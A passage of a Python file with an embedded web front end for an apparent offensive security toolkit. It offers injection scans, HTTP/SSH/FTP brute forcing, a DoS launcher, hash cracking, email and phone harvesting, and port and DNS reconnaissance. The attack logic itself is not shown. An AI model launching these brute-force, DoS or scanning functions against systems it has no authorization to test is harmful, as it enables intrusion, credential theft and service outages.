                addConsole('sqliConsole', `Error: ${error.message}`, 'error');
            }
        }
        
        async function startXssScan() {
            const target = document.getElementById('xssTarget').value;
            const xssType = document.getElementById('xssType').value;
            
            if(!target) {
                alert('Please enter a target URL');
                return;
            }
            
            addConsole('xssConsole', `Starting XSS test on ${target}...`, 'info');
            
            try {
                const result = await apiCall('/api/xss', {
                    url: target,
                    xss_type: xssType
                });
                
                if(result.vulnerable) {
                    addConsole('xssConsole', `⚠️ VULNERABLE to XSS!`, 'error');
                    addConsole('xssConsole', `Type: ${result.type}`, 'warning');
                    addConsole('xssConsole', `Parameter: ${result.parameter}`, 'warning');
                    addConsole('xssConsole', `Payload: ${result.payload}`, 'warning');
                    
                    foundVulns++;
                } else {
                    addConsole('xssConsole', `✓ Not vulnerable to XSS`, 'success');
                }
                
                addConsole('xssConsole', `Payloads tested: ${result.payloads_tested}`, 'info');
                addConsole('xssConsole', `Scan time: ${result.scan_time}s`, 'info');
                
            } catch(error) {
                addConsole('xssConsole', `Error: ${error.message}`, 'error');
            }
        }
        
        async function startLfiScan() {
            const target = document.getElementById('lfiTarget').value;
            const lfiType = document.getElementById('lfiType').value;
            
            if(!target) {
                alert('Please enter a target URL');
                return;
            }
            
            addConsole('lfiConsole', `Starting LFI/RFI test on ${target}...`, 'info');
            
            try {
                const result = await apiCall('/api/lfi', {
                    url: target,
                    scan_type: lfiType
                });
                
                if(result.vulnerable) {
                    addConsole('lfiConsole', `⚠️ VULNERABLE to ${result.type.toUpperCase()}!`, 'error');
                    addConsole('lfiConsole', `Parameter: ${result.parameter}`, 'warning');
                    addConsole('lfiConsole', `Payload: ${result.payload}`, 'warning');
                    
                    if(result.extracted_data) {
                        addConsole('lfiConsole', `Extracted data: ${result.extracted_data.substring(0, 200)}...`, 'warning');
                    }
                    
                    foundVulns++;
                } else {
                    addConsole('lfiConsole', `✓ Not vulnerable to LFI/RFI`, 'success');
                }
                
            } catch(error) {
                addConsole('lfiConsole', `Error: ${error.message}`, 'error');
            }
        }
        
        async function startCmdScan() {
            const target = document.getElementById('cmdTarget').value;
            const osType = document.getElementById('cmdOS').value;
            
            if(!target) {
                alert('Please enter a target URL');
                return;
            }
            
            if(!confirm('WARNING: This tool can execute REAL system commands. Are you authorized to test this target?')) {
                return;
            }
            
            addConsole('cmdConsole', `Starting Command Injection test on ${target}...`, 'info');
            
            try {
                const result = await apiCall('/api/cmd', {
                    url: target,
                    os_type: osType
                });
                
                if(result.vulnerable) {
                    addConsole('cmdConsole', `⚠️ VULNERABLE to Command Injection!`, 'error');
                    addConsole('cmdConsole', `Parameter: ${result.parameter}`, 'warning');
                    addConsole('cmdConsole', `Payload: ${result.payload}`, 'warning');
                    
                    if(result.output) {
                        addConsole('cmdConsole', `Command output: ${result.output.substring(0, 200)}...`, 'warning');
                    }
                    
                    foundVulns++;
                } else {
                    addConsole('cmdConsole', `✓ Not vulnerable to Command Injection`, 'success');
                }
                
            } catch(error) {
                addConsole('cmdConsole', `Error: ${error.message}`, 'error');
            }
        }
        
        async function startBruteForce() {
            // Determine which tab is active
            let bruteType = 'http';
            let config = {};
            
            if(document.getElementById('httpBrute').classList.contains('active')) {
                bruteType = 'http';
                config = {
                    url: document.getElementById('bfHttpUrl').value,
                    username_field: document.getElementById('bfHttpUserField').value,
                    password_field: document.getElementById('bfHttpPassField').value,
                    success_indicator: document.getElementById('bfHttpSuccess').value
                };
            } else if(document.getElementById('basicBrute').classList.contains('active')) {
                bruteType = 'basic';
                config = {
                    url: document.getElementById('bfBasicUrl').value
                };
            } else {
                bruteType = 'custom';
                try {
                    config = JSON.parse(document.getElementById('bfCustomRequest').value);
                } catch(e) {
                    alert('Invalid JSON in custom request');
                    return;
                }
            }
            
            const usernames = document.getElementById('bfUsernames').value.split('\n').filter(u => u.trim());
            const passwords = document.getElementById('bfPasswords').value.split('\n').filter(p => p.trim());
            const threads = document.getElementById('bfThreads').value;
            const delay = document.getElementById('bfDelay').value;
            
            if(!config.url || usernames.length === 0 || passwords.length === 0) {
                alert('Please fill all required fields');
                return;
            }
            
            if(!confirm('This will perform REAL brute force attacks. Are you authorized to test this target?')) {
                return;
            }
            
            addConsole('bfConsole', `Starting brute force attack on ${config.url}...`, 'warning');
            addConsole('bfConsole', `Usernames: ${usernames.length}, Passwords: ${passwords.length}`, 'info');
            addConsole('bfConsole', `Total combinations: ${usernames.length * passwords.length}`, 'info');
            
            try {
                const result = await apiCall('/api/bruteforce', {
                    type: bruteType,
                    config: config,
                    usernames: usernames,
                    passwords: passwords,
                    threads: threads,
                    delay: delay
                });
                
                addConsole('bfConsole', `Brute force completed.`, 'info');
                addConsole('bfConsole', `Attempts: ${result.attempts}`, 'info');
                addConsole('bfConsole', `Time: ${result.time}s`, 'info');
                
                if(result.found) {
                    addConsole('bfConsole', `✅ CREDENTIALS FOUND!`, 'error');
                    addConsole('bfConsole', `Username: ${result.found.username}`, 'error');
                    addConsole('bfConsole', `Password: ${result.found.password}`, 'error');
                } else {
                    addConsole('bfConsole', `❌ No credentials found`, 'warning');
                }
                
            } catch(error) {
                addConsole('bfConsole', `Error: ${error.message}`, 'error');
            }
        }
        
        async function startDosAttack() {
            const target = document.getElementById('dosTarget').value;
            const attackType = document.getElementById('dosType').value;
            const threads = document.getElementById('dosThreads').value;
            const duration = document.getElementById('dosDuration').value;
            
            if(!target) {
                alert('Please enter a target URL');
                return;
            }
            
            if(!confirm(`☠️ EXTREME WARNING: This will launch REAL DoS attacks.\n\nTarget: ${target}\nType: ${attackType}\nThreads: ${threads}\nDuration: ${duration}s\n\nAre you SURE you have authorization?`)) {
                return;
            }
            
            addConsole('dosConsole', `🚀 Launching ${attackType} DoS attack on ${target}...`, 'warning');
            addConsole('dosConsole', `Threads: ${threads}, Duration: ${duration}s`, 'info');
            
            try {
                const result = await apiCall('/api/dos', {
                    target: target,
                    attack_type: attackType,
                    threads: threads,
                    duration: duration
                });
                
                addConsole('dosConsole', `Attack started: ${result.message}`, 'warning');
                addConsole('dosConsole', `Attack ID: ${result.attack_id}`, 'info');
                
                // Monitor attack progress
                if(result.attack_id) {
                    monitorDosAttack(result.attack_id);
                }
                
            } catch(error) {
                addConsole('dosConsole', `Error: ${error.message}`, 'error');
            }
        }
        
        async function monitorDosAttack(attackId) {
            const interval = setInterval(async () => {
                try {
                    const response = await fetch(`/api/dos/status/${attackId}`);
                    const data = await response.json();
                    
                    if(data.status === 'completed' || data.status === 'stopped') {
                        clearInterval(interval);
                        addConsole('dosConsole', `Attack ${data.status}.`, 'info');
                        addConsole('dosConsole', `Total requests: ${data.total_requests}`, 'info');
                        addConsole('dosConsole', `Total bytes: ${data.total_bytes}`, 'info');
                        addConsole('dosConsole', `Duration: ${data.duration}s`, 'info');
                    } else {
                        addConsole('dosConsole', `Attack in progress: ${data.requests_per_second} requests/sec`, 'info');
                    }
                } catch(error) {
                    clearInterval(interval);
                }
            }, 2000);
        }
        
        async function startSshBrute() {
            const target = document.getElementById('sshTarget').value;
            const usernames = document.getElementById('sshUsernames').value.split('\n').filter(u => u.trim());
            const passwords = document.getElementById('sshPasswords').value.split('\n').filter(p => p.trim());
            
            if(!target) {
                alert('Please enter SSH target');
                return;
            }
            
            if(!confirm('This will perform REAL SSH brute force attacks. Are you authorized?')) {
                return;
            }
            
            addConsole('sshConsole', `Starting SSH brute force on ${target}...`, 'warning');
            
            try {
                const result = await apiCall('/api/ssh', {
                    target: target,
                    usernames: usernames,
                    passwords: passwords
                });
                
                addConsole('sshConsole', `SSH brute force completed.`, 'info');
                addConsole('sshConsole', `Attempts: ${result.attempts}`, 'info');
                addConsole('sshConsole', `Time: ${result.time}s`, 'info');
                
                if(result.found) {
                    addConsole('sshConsole', `✅ CREDENTIALS FOUND!`, 'error');
                    addConsole('sshConsole', `Username: ${result.found.username}`, 'error');
                    addConsole('sshConsole', `Password: ${result.found.password}`, 'error');
                } else {
                    addConsole('sshConsole', `❌ No credentials found`, 'warning');
                }
                
            } catch(error) {
                addConsole('sshConsole', `Error: ${error.message}`, 'error');
            }
        }
        
        async function startFtpBrute() {
            const target = document.getElementById('ftpTarget').value;
            const usernames = document.getElementById('ftpUsernames').value.split('\n').filter(u => u.trim());
            const passwords = document.getElementById('ftpPasswords').value.split('\n').filter(p => p.trim());
            
            if(!target) {
                alert('Please enter FTP target');
                return;
            }
            
            addConsole('ftpConsole', `Starting FTP brute force on ${target}...`, 'warning');
            
            try {
                const result = await apiCall('/api/ftp', {
                    target: target,
                    usernames: usernames,
                    passwords: passwords
                });
                
                addConsole('ftpConsole', `FTP brute force completed.`, 'info');
                addConsole('ftpConsole', `Attempts: ${result.attempts}`, 'info');
                addConsole('ftpConsole', `Time: ${result.time}s`, 'info');
                
                if(result.found) {
                    addConsole('ftpConsole', `✅ CREDENTIALS FOUND!`, 'error');
                    addConsole('ftpConsole', `Username: ${result.found.username}`, 'error');
                    addConsole('ftpConsole', `Password: ${result.found.password}`, 'error');
                } else {
                    addConsole('ftpConsole', `❌ No credentials found`, 'warning');
                }
                
            } catch(error) {
                addConsole('ftpConsole', `Error: ${error.message}`, 'error');
            }
        }
        
        async function startCrawler() {
            const url = document.getElementById('crawlUrl').value;
            const depth = document.getElementById('crawlDepth').value;
            const threads = document.getElementById('crawlThreads').value;
            
            if(!url) {
                alert('Please enter a URL');
                return;
            }
            
            showLoading('crawlResults');
            
            try {
                const result = await apiCall('/api/crawl', {
                    url: url,
                    depth: depth,
                    threads: threads,
                    options: {
                        extract_links: document.getElementById('crawlExtractLinks').checked,
                        extract_emails: document.getElementById('crawlExtractEmails').checked,
                        extract_phones: document.getElementById('crawlExtractPhones').checked,
                        check_vulns: document.getElementById('crawlCheckVulns').checked
                    }
                }, null, 'crawlStatus');
                
                clearResults('crawlResults');
                
                addResult('crawlResults', `
                    <div class="result-title">Crawler Results</div>
                    <div class="result-content">
                        <div>Start URL: ${result.start_url}</div>
                        <div>Pages Crawled: ${result.pages.length}</div>
                        <div>Links Found: ${result.total_links}</div>
                        <div>Crawl Time: ${result.crawl_time}s</div>
                    </div>
                `, 'info');
                
                if(result.pages.length > 0) {
                    addResult('crawlResults', `
                        <div class="result-title">Crawled Pages</div>
                    `, 'success');
                    
                    result.pages.slice(0, 20).forEach(page => {
                        addResult('crawlResults', `
                            <div class="result-content">
                                <a href="${page.url}" target="_blank">${page.url}</a>
                                <div style="font-size: 0.9em; color: #666">
                                    Status: ${page.status} | Size: ${page.size} bytes
                                    ${page.title ? `| Title: ${page.title}` : ''}
                                </div>
                            </div>
                        `, 'info');
                    });
                    
                    if(result.pages.length > 20) {
                        addResult('crawlResults', `
                            <div class="result-content">
                                ... and ${result.pages.length - 20} more pages
                            </div>
                        `, 'info');
                    }
                }
                
                if(result.emails && result.emails.length > 0) {
                    addResult('crawlResults', `
                        <div class="result-title">Emails Found</div>
                        <div class="result-content">
                            ${result.emails.map(email => `<div>${email}</div>`).join('')}
                        </div>
                    `, 'success');
                }
                
                if(result.phone_numbers && result.phone_numbers.length > 0) {
                    addResult('crawlResults', `
                        <div class="result-title">Phone Numbers Found</div>
                        <div class="result-content">
                            ${result.phone_numbers.map(phone => `<div>${phone}</div>`).join('')}
                        </div>
                    `, 'success');
                }
                
                if(result.vulnerabilities && result.vulnerabilities.length > 0) {
                    addResult('crawlResults', `
                        <div class="result-title">Vulnerabilities Found</div>
                    `, 'error');
                    
                    result.vulnerabilities.forEach(vuln => {
                        addResult('crawlResults', `
                            <div class="result-content">
                                <div><strong>${vuln.type}</strong> on ${vuln.url}</div>
                                <div>${vuln.description}</div>
                            </div>
                        `, 'error');
                    });
                }
                
            } catch(error) {
                addResult('crawlResults', `
                    <div class="result-title">Error</div>
                    <div class="result-content">${error.message}</div>
                `, 'error');
            }
        }
        
        // Utility functions for hash tools
        function generateMD5() {
            const text = document.getElementById('hashInput').value;
            if(!text) return;
            const hash = CryptoJS.MD5(text).toString();
            document.getElementById('hashOutput').value = `MD5: ${hash}`;
        }
        
        function generateSHA1() {
            const text = document.getElementById('hashInput').value;
            if(!text) return;
            const hash = CryptoJS.SHA1(text).toString();
            document.getElementById('hashOutput').value = `SHA1: ${hash}`;
        }
        
        function generateSHA256() {
            const text = document.getElementById('hashInput').value;
            if(!text) return;
            const hash = CryptoJS.SHA256(text).toString();
            document.getElementById('hashOutput').value = `SHA256: ${hash}`;
        }
        
        function generateSHA512() {
            const text = document.getElementById('hashInput').value;
            if(!text) return;
            const hash = CryptoJS.SHA512(text).toString();
            document.getElementById('hashOutput').value = `SHA512: ${hash}`;
        }
        
        function generateAllHashes() {
            const text = document.getElementById('hashInput').value;
            if(!text) return;
            
            const md5 = CryptoJS.MD5(text).toString();
            const sha1 = CryptoJS.SHA1(text).toString();
            const sha256 = CryptoJS.SHA256(text).toString();
            const sha512 = CryptoJS.SHA512(text).toString();
            
            document.getElementById('hashOutput').value = 
                `MD5: ${md5}\nSHA1: ${sha1}\nSHA256: ${sha256}\nSHA512: ${sha512}`;
        }
        
        async function crackHash() {
            const hash = document.getElementById('crackHashInput').value;
            const hashType = document.getElementById('crackHashType').value;
            const wordlist = document.getElementById('crackWordlist').value.split('\n').filter(w => w.trim());
            
            if(!hash || wordlist.length === 0) return;
            
            const resultDiv = document.getElementById('crackResult');
            resultDiv.innerHTML = '<div class="loading"><div class="spinner"></div>Cracking hash...</div>';
            
            try {
                const result = await apiCall('/api/hash/crack', {
                    hash: hash,
                    hash_type: hashType,
                    wordlist: wordlist
                });
                
                if(result.found) {
                    resultDiv.innerHTML = `
                        <div class="alert alert-success">
                            <i class="fas fa-check"></i> Hash cracked!
                            <div>Original: ${hash}</div>
                            <div>Plaintext: ${result.plaintext}</div>
                            <div>Time: ${result.time}s</div>
                        </div>
                    `;
                } else {
                    resultDiv.innerHTML = `
                        <div class="alert alert-warning">
                            <i class="fas fa-times"></i> Hash not found in wordlist
                            <div>Tried ${result.tried} combinations</div>
                            <div>Time: ${result.time}s</div>
                        </div>
                    `;
                }
            } catch(error) {
                resultDiv.innerHTML = `
                    <div class="alert alert-danger">
                        <i class="fas fa-exclamation-triangle"></i> Error: ${error.message}
                    </div>
                `;
            }
        }
        
        async function verifyHash() {
            const text = document.getElementById('verifyText').value;
            const hash = document.getElementById('verifyHash').value;
            const hashType = document.getElementById('verifyType').value;
            
            if(!text || !hash) return;
            
            const resultDiv = document.getElementById('verifyResult');
            
            try {
                const result = await apiCall('/api/hash/verify', {
                    text: text,
                    hash: hash,
                    hash_type: hashType
                });
                
                if(result.valid) {
                    resultDiv.innerHTML = `
                        <div class="alert alert-success">
                            <i class="fas fa-check"></i> Hash matches!
                            <div>Text: ${text}</div>
                            <div>Hash: ${hash}</div>
                        </div>
                    `;
                } else {
                    resultDiv.innerHTML = `
                        <div class="alert alert-warning">
                            <i class="fas fa-times"></i> Hash does not match
                            <div>Expected: ${result.expected_hash}</div>
                            <div>Provided: ${hash}</div>
                        </div>
                    `;
                }
            } catch(error) {
                resultDiv.innerHTML = `
                    <div class="alert alert-danger">
                        <i class="fas fa-exclamation-triangle"></i> Error: ${error.message}
                    </div>
                `;
            }
        }
        
        // Encoder/Decoder functions
        function base64Encode() {
            const text = document.getElementById('encodeInput').value;
            document.getElementById('encodeOutput').value = btoa(text);
        }
        
        function base64Decode() {
            const text = document.getElementById('encodeInput').value;
            try {
                document.getElementById('encodeOutput').value = atob(text);
            } catch {
                document.getElementById('encodeOutput').value = 'Invalid Base64';
            }
        }
        
        function urlEncode() {
            const text = document.getElementById('encodeInput').value;
            document.getElementById('encodeOutput').value = encodeURIComponent(text);
        }
        
        function urlDecode() {
            const text = document.getElementById('encodeInput').value;
            try {
                document.getElementById('encodeOutput').value = decodeURIComponent(text);
            } catch {
                document.getElementById('encodeOutput').value = 'Invalid URL encoding';
            }
        }
        
        function htmlEncode() {
            const text = document.getElementById('encodeInput').value;
            document.getElementById('encodeOutput').value = 
                text.replace(/[&<>"']/g, function(m) {
                    return {'&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;'}[m];
                });
        }
        
        function htmlDecode() {
            const text = document.getElementById('encodeInput').value;
            document.getElementById('encodeOutput').value = 
                text.replace(/&amp;|&lt;|&gt;|&quot;|&#39;/g, function(m) {
                    return {'&amp;': '&', '&lt;': '<', '&gt;': '>', '&quot;': '"', '&#39;': "'"}[m];
                });
        }
        
        function hexEncode() {
            const text = document.getElementById('encodeInput').value;
            let hex = '';
            for(let i = 0; i < text.length; i++) {
                hex += text.charCodeAt(i).toString(16).padStart(2, '0');
            }
            document.getElementById('encodeOutput').value = hex;
        }
        
        function hexDecode() {
            const text = document.getElementById('encodeInput').value;
            try {
                let str = '';
                for(let i = 0; i < text.length; i += 2) {
                    str += String.fromCharCode(parseInt(text.substr(i, 2), 16));
                }
                document.getElementById('encodeOutput').value = str;
            } catch {
                document.getElementById('encodeOutput').value = 'Invalid hex string';
            }
        }
        
        // Network tools
        async function startPing() {
            const target = document.getElementById('pingTarget').value;
            const count = document.getElementById('pingCount').value;
            
            if(!target) return;
            
            const resultDiv = document.getElementById('pingResult');
            resultDiv.innerHTML = '<div class="loading"><div class="spinner"></div>Pinging...</div>';
            
            try {
                const result = await apiCall('/api/network/ping', {
                    target: target,
                    count: count
                });
                
                let html = '<div class="alert alert-success">';
                html += `<i class="fas fa-check"></i> Ping results for ${target}`;
                html += `<div>Packets sent: ${result.packets_sent}</div>`;
                html += `<div>Packets received: ${result.packets_received}</div>`;
                html += `<div>Packet loss: ${result.packet_loss}%</div>`;
                
                if(result.times && result.times.length > 0) {
                    html += '<div>Round-trip times:</div>';
                    result.times.forEach(time => {
                        html += `<div>${time} ms</div>`;
                    });
                    if(result.min_time && result.avg_time && result.max_time) {
                        html += `<div>Min/Avg/Max: ${result.min_time}/${result.avg_time}/${result.max_time} ms</div>`;
                    }
                }
                
                html += '</div>';
                resultDiv.innerHTML = html;
                
            } catch(error) {
                resultDiv.innerHTML = `
                    <div class="alert alert-danger">
                        <i class="fas fa-exclamation-triangle"></i> Error: ${error.message}
                    </div>
                `;
            }
        }
        
        async function startTraceroute() {
            const target = document.getElementById('traceTarget').value;
            
            if(!target) return;
            
            const resultDiv = document.getElementById('traceResult');
            resultDiv.innerHTML = '<div class="loading"><div class="spinner"></div>Tracing route...</div>';
            
            try {
                const result = await apiCall('/api/network/traceroute', {
                    target: target
                });
                
                let html = '<div class="alert alert-success">';
                html += `<i class="fas fa-check"></i> Traceroute to ${target}`;
                
                if(result.hops && result.hops.length > 0) {
                    html += '<div style="font-family: monospace; margin-top: 10px;">';
                    result.hops.forEach(hop => {
                        html += `<div>${hop.hop}. ${hop.ip || '*'} ${hop.hostname || ''} ${hop.times ? hop.times.map(t => t + 'ms').join(' ') : ''}</div>`;
                    });
                    html += '</div>';
                }
                
                html += '</div>';
                resultDiv.innerHTML = html;
                
            } catch(error) {
                resultDiv.innerHTML = `
                    <div class="alert alert-danger">
                        <i class="fas fa-exclamation-triangle"></i> Error: ${error.message}
                    </div>
                `;
            }
        }
        
        async function startWhois() {
            const target = document.getElementById('whoisTarget').value;
            
            if(!target) return;
            
            const resultDiv = document.getElementById('whoisResult');
            resultDiv.innerHTML = '<div class="loading"><div class="spinner"></div>Looking up WHOIS...</div>';
            
            try {
                const result = await apiCall('/api/network/whois', {
                    target: target
                });
                
                let html = '<div class="alert alert-success">';
                html += `<i class="fas fa-check"></i> WHOIS information for ${target}`;
                
                for(const [key, value] of Object.entries(result)) {
                    if(value && typeof value === 'string') {
                        html += `<div><strong>${key}:</strong> ${value}</div>`;
                    }
                }
                
                html += '</div>';
                resultDiv.innerHTML = html;
                
            } catch(error) {
                resultDiv.innerHTML = `
                    <div class="alert alert-danger">
                        <i class="fas fa-exclamation-triangle"></i> Error: ${error.message}
                    </div>
                `;
            }
        }
        
        async function startGeoIP() {
            const target = document.getElementById('geoipTarget').value;
            
            if(!target) return;
            
            const resultDiv = document.getElementById('geoipResult');
            resultDiv.innerHTML = '<div class="loading"><div class="spinner"></div>Looking up GeoIP...</div>';
            
            try {
                const result = await apiCall('/api/network/geoip', {
                    target: target
                });
                
                let html = '<div class="alert alert-success">';
                html += `<i class="fas fa-check"></i> GeoIP information for ${target}`;
                
                for(const [key, value] of Object.entries(result)) {
                    if(value) {
                        html += `<div><strong>${key}:</strong> ${value}</div>`;
                    }
                }
                
                html += '</div>';
                resultDiv.innerHTML = html;
                
            } catch(error) {
                resultDiv.innerHTML = `
                    <div class="alert alert-danger">
                        <i class="fas fa-exclamation-triangle"></i> Error: ${error.message}
                    </div>
                `;
            }
        }
        
        // Header analyzer
        async function analyzeHeaders() {
            const url = document.getElementById('headerUrl').value;
            
            if(!url) return;
            
            showLoading('headerResults');
            
            try {
                const result = await apiCall('/api/headers', {
                    url: url
                });
                
                clearResults('headerResults');
                
                addResult('headerResults', `
                    <div class="result-title">Header Analysis Results</div>
                    <div class="result-content">
                        <div>URL: ${result.url}</div>
                        <div>Status: ${result.status}</div>
                        <div>Server: ${result.server || 'Not specified'}</div>
                    </div>
                `, 'info');
                
                if(result.headers) {
                    addResult('headerResults', `
                        <div class="result-title">HTTP Headers</div>
                    `, 'info');
                    
                    for(const [key, value] of Object.entries(result.headers)) {
                        addResult('headerResults', `
                            <div class="result-content">
                                <strong>${key}:</strong> ${value}
                            </div>
                        `, 'info');
                    }
                }
                
                if(result.security_analysis) {
                    addResult('headerResults', `
                        <div class="result-title">Security Analysis</div>
                    `, 'info');
                    
                    result.security_analysis.forEach(analysis => {
                        addResult('headerResults', `
                            <div class="result-content">
                                <strong>${analysis.header}:</strong> ${analysis.status}
                                <div style="font-size: 0.9em; color: #666">${analysis.description}</div>
                            </div>
                        `, analysis.status === 'OK' ? 'success' : 'warning');
                    });
                }
                
            } catch(error) {
                addResult('headerResults', `
                    <div class="result-title">Error</div>
                    <div class="result-content">${error.message}</div>
                `, 'error');
            }
        }
        
        // Stop scan function
        function stopScan(scanType) {
            fetch(`/api/stop/${scanType}`, {method: 'POST'});
            
            let consoleId = scanType + 'Console';
            if(document.getElementById(consoleId)) {
                addConsole(consoleId, 'Scan stopped by user', 'warning');
            }
        }
        
        // Initialize
        document.addEventListener('DOMContentLoaded', function() {
            // Load CryptoJS for hash functions
            const script = document.createElement('script');
            script.src = 'https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js';
            document.head.appendChild(script);
            
            // Update stats every 5 seconds
            setInterval(async () => {
                try {
                    const response = await fetch('/api/stats');
                    const data = await response.json();
                    document.getElementById('activeScans').textContent = data.active_scans || 0;
                    document.getElementById('foundVulns').textContent = data.found_vulns || 0;
                } catch(error) {
                    // Ignore errors
                }
            }, 5000);
        });
    </script>
    
    <!-- Include CryptoJS -->
    <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js"></script>
</body>
</html>
'''

# STABLE Security Scanner Implementation
class StableSecurityScanner:
    def __init__(self):
        self.active_scans = {}
        self.active_attacks = {}
        self.found_vulns = 0
        self.scan_counter = 0
        self.attack_counter = 0
        self.wordlists = self.load_wordlists()
    
    def load_wordlists(self):
        """Load common wordlists for various tools"""
        return {
            'subdomains_small': ['www', 'mail', 'ftp', 'admin', 'webmail', 'api', 'blog', 'dev', 'test', 'staging'],
            'subdomains_medium': [
                'www', 'mail', 'ftp', 'admin', 'webmail', 'api', 'blog', 'dev', 'test', 'staging',
                'secure', 'vpn', 'ssh', 'remote', 'cpanel', 'whm', 'webdisk', 'ns1', 'ns2', 'mx',
                'static', 'cdn', 'assets', 'media', 'images', 'app', 'mobile', 'shop', 'store',
                'support', 'help', 'status', 'monitor', 'analytics', 'dashboard', 'portal'
            ],
            'dir_small': [
                'admin', 'login', 'dashboard', 'panel', 'wp-admin', 'administrator',
                'api', 'test', 'backup', 'config', 'robots.txt', '.git', '.env'
            ],
            'passwords_common': [
                'admin', 'password', '123456', '12345678', 'qwerty', 'letmein',
                'welcome', 'monkey', 'password1', '123123', '1234', '12345'
            ]
        }
    
    def generate_id(self, prefix):
        self.scan_counter += 1
        return f"{prefix}_{self.scan_counter}_{int(time.time())}"
    
    def safe_json(self, data):
        """Convert data to JSON-safe format"""
        if isinstance(data, dict):
            return {k: self.safe_json(v) for k, v in data.items()}
        elif isinstance(data, list):
            return [self.safe_json(item) for item in data]
        elif isinstance(data, (str, int, float, bool, type(None))):
            return data
        else:
            return str(data)
    
    # ==================== RECONNAISSANCE TOOLS ====================
    
    def info_gathering(self, target, scan_type='basic', options=None):
        """Comprehensive information gathering"""
        scan_id = self.generate_id('info')
        self.active_scans[scan_id] = {'target': target, 'type': 'info', 'start': time.time()}
        
        try:
            result = {'target': target, 'scan_type': scan_type}
            
            # Get IP address
            try:
                ip = socket.gethostbyname(target)
                result['ip'] = ip
            except:
                result['ip'] = 'Unknown'
            
            # Get hostname from IP
            try:
                if result['ip'] != 'Unknown':
                    hostname = socket.gethostbyaddr(result['ip'])[0]
                    result['hostname'] = hostname
                else:
                    result['hostname'] = target
            except:
                result['hostname'] = target
            
            # DNS records if requested
            if options and options.get('dns', True):
                dns_records = []
                try:
                    resolver = dns.resolver.Resolver()
                    
                    # A records
                    try:
                        answers = resolver.resolve(target, 'A')
                        for rdata in answers:
                            dns_records.append({'type': 'A', 'value': str(rdata)})
                    except:
                        pass
                    
                    # AAAA records
                    try:
                        answers = resolver.resolve(target, 'AAAA')
                        for rdata in answers:
                            dns_records.append({'type': 'AAAA', 'value': str(rdata)})
                    except:
                        pass
                    
                    # MX records
                    try:
                        answers = resolver.resolve(target, 'MX')
                        for rdata in answers:
                            dns_records.append({'type': 'MX', 'value': str(rdata)})
                    except:
                        pass
                    
                    # NS records
                    try:
                        answers = resolver.resolve(target, 'NS')
                        for rdata in answers:
                            dns_records.append({'type': 'NS', 'value': str(rdata)})
                    except:
                        pass
                    
                    # TXT records
                    try:
                        answers = resolver.resolve(target, 'TXT')
                        for rdata in answers:
                            dns_records.append({'type': 'TXT', 'value': str(rdata)})
                    except:
                        pass
                    
                    result['dns_records'] = dns_records
                except Exception as e:
                    result['dns_error'] = str(e)
            
            # Port scan if requested
            if options and options.get('ports', True):
                open_ports = []
                common_ports = [21, 22, 23, 25, 53, 80, 110, 143, 443, 445, 993, 995, 3306, 3389, 8080, 8443]
                
                for port in common_ports:
                    try:
                        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        sock.settimeout(1)
                        result_code = sock.connect_ex((result['ip'], port))
                        sock.close()
                        
                        if result_code == 0:
                            service = self.get_service_name(port)
                            open_ports.append({
                                'port': port,
                                'service': service,
                                'state': 'open'
                            })
                    except:
                        pass
                
                result['open_ports'] = open_ports
            
            # WHOIS lookup if requested
            if options and options.get('whois', True):
                try:
                    import whois
                    w = whois.whois(target)
                    
                    whois_info = {}
                    if w.domain_name:
                        whois_info['domain'] = str(w.domain_name)
                    if w.registrar:
                        whois_info['registrar'] = w.registrar
                    if w.creation_date:
                        whois_info['creation_date'] = str(w.creation_date)
                    if w.expiration_date:
                        whois_info['expiration_date'] = str(w.expiration_date)
                    if w.name_servers:
                        whois_info['name_servers'] = list(w.name_servers)
                    
                    result['whois'] = whois_info
                except Exception as e:
                    result['whois_error'] = str(e)
            
            # Technology detection if requested
            if options and options.get('tech', True):
                technologies = []
                for proto in ['https://', 'http://']:
                    try:
                        url = proto + target
                        response = requests.get(url, timeout=5, verify=False, headers={
                            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
                        })
                        
                        # Check server headers
                        server = response.headers.get('Server', '')
                        if server:
                            technologies.append(f"Server: {server}")
                        
                        # Check powered-by headers
                        powered_by = response.headers.get('X-Powered-By', '')
                        if powered_by:
                            technologies.append(f"Powered By: {powered_by}")
                        
                        # Check common frameworks
                        content = response.text.lower()
                        if 'wordpress' in content:
                            technologies.append("WordPress")
                        if 'drupal' in content:
                            technologies.append("Drupal")
                        if 'joomla' in content:
                            technologies.append("Joomla")
                        if 'laravel' in content:
                            technologies.append("Laravel")
                        if 'react' in content:
                            technologies.append("React")
                        if 'vue' in content:
                            technologies.append("Vue.js")
                        if 'jquery' in content:
                            technologies.append("jQuery")
                        
                        break
                    except:
                        continue
                
                result['technologies'] = technologies
            
            # SSL/TLS info if requested
            if options and options.get('ssl', True):
                ssl_info = {}
                try:
                    hostname = target if '.' in target else f"{target}.com"
                    context = ssl.create_default_context()
                    
                    with socket.create_connection((hostname, 443), timeout=5) as sock:
                        with context.wrap_socket(sock, server_hostname=hostname) as ssock:
                            cert = ssock.getpeercert()
                            
                            # Extract certificate info
                            if cert:
                                ssl_info['issuer'] = dict(x[0] for x in cert['issuer']) if isinstance(cert['issuer'], tuple) else cert['issuer']
                                ssl_info['subject'] = dict(x[0] for x in cert['subject']) if isinstance(cert['subject'], tuple) else cert['subject']
                                ssl_info['version'] = cert.get('version', 'Unknown')
                                ssl_info['notBefore'] = cert.get('notBefore', 'Unknown')
                                ssl_info['notAfter'] = cert.get('notAfter', 'Unknown')
                                
                                # Check expiration
                                if 'notAfter' in cert:
                                    exp_date = datetime.strptime(cert['notAfter'], '%b %d %H:%M:%S %Y %Z')
                                    days_left = (exp_date - datetime.now()).days
                                    ssl_info['days_until_expiry'] = days_left
                                    ssl_info['expiry_status'] = 'OK' if days_left > 30 else 'WARNING' if days_left > 0 else 'EXPIRED'
                except Exception as e:
                    ssl_info['error'] = str(e)
                
                result['ssl_info'] = ssl_info
            
            result['scan_time'] = round(time.time() - self.active_scans[scan_id]['start'], 2)
            del self.active_scans[scan_id]
            
            return self.safe_json(result)
            
        except Exception as e:
            if scan_id in self.active_scans:
                del self.active_scans[scan_id]
            return self.safe_json({'error': str(e), 'target': target})
    
